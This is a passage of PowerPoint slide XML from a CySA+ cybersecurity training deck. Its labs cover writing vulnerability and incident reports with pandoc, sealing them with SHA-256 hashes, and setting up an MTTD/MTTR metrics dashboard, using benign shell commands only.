            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Build the executive summary</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; report.md &lt;&lt;'EOF'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Render to HTML and (optionally) PDF</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Open report.html in a browser to verify formatting before mailing.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ pandoc report.md -s -o report.html</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872</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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4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26 — Hands-On Steps (cont'd)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21534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1534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05840" y="263118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2631186"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Hash and archive</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Reports are evidence; hashes prove integrity (and the auditor will check).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2585466"/>
            <a:ext cx="3977639" cy="5486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52360" y="2585466"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ sha256sum report.md report.html prioritised.csv &gt; MANIFEST.sha256</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="21534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4064508"/>
            <a:ext cx="91440" cy="21534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005840" y="4912614"/>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4912614"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="9509760" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Map every section to a CySA+ 4.1 bullet</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873</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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26 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Prioritise vulnerabilities with KEV + CVSS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Author a stakeholder-grade vulnerability report with executive summary, Top 10, action plan, inhibitors, and compliance posture.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Render Markdown to HTML/PDF with pandoc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Map every section back to the CySA+ 4.1 exam blueprint.</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874</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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27 — Executive Incident Report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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will write the executive incident report from the scenario walked in Labs 20, 23, 24. It will satisfy every CySA+ 4.2 bullet: executive summary, Who-What-When-Where-Why, recommendations, timeline, impact, scope, evidence, communications, root cause, lessons learned, metrics.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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875</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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4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27 — Hands-On Steps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01269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01269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05840" y="2060829"/>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2060829"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Tools</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2015109"/>
            <a:ext cx="3977639" cy="5486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52360" y="2015109"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y pandoc</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2923794"/>
            <a:ext cx="10634472" cy="101269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2923794"/>
            <a:ext cx="91440" cy="101269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005840" y="3201543"/>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3201543"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2923794"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Use the canonical IR report template</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3155823"/>
            <a:ext cx="3977639" cy="5486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52360" y="3155823"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; incident_report.md &lt;&lt;'EOF'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="101269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4064508"/>
            <a:ext cx="91440" cy="101269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005840" y="434225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05840" y="4342257"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Render and seal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The hash is the seal — once distributed, any edit changes the hash and breaks the audit trail.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4296537"/>
            <a:ext cx="3977639" cy="5486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52360" y="4296537"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ pandoc incident_report.md -s -o incident_report.html</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5205222"/>
            <a:ext cx="10634472" cy="101269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77240" y="5205222"/>
            <a:ext cx="91440" cy="101269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1005840" y="5482971"/>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05840" y="5482971"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5205222"/>
            <a:ext cx="9509760" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Map every section to CySA+ 4.2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 3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34" name="TextBox 3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5" name="TextBox 3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876</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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27 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Author a complete executive incident report that satisfies every CySA+ 4.2 bullet.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Cleanly link evidence to chain-of-custody (Lab 21).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Capture lessons learned and KPIs that feed the next preparation cycle.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Render and seal a report with pandoc + SHA-256.</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877</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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28 — Security Metrics Dashboard (MTTD / MTTR)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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will compute and plot the three KPIs CySA+ 4.2 explicitly calls out — Mean Time To Detect (MTTD), Mean Time To Respond (MTTR), and Mean Time To Remediate (MTTR-rem) — plus alert volume. The output is a one-page PNG dashboard for the monthly CISO review.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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878</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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4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28 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install Python + matplotlib</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y python3-pip</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Seed last quarter's incident data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Columns map to CySA+ 4.2 KPIs:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ mkdir -p /tmp/lab28 &amp;&amp; cd /tmp/lab28</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
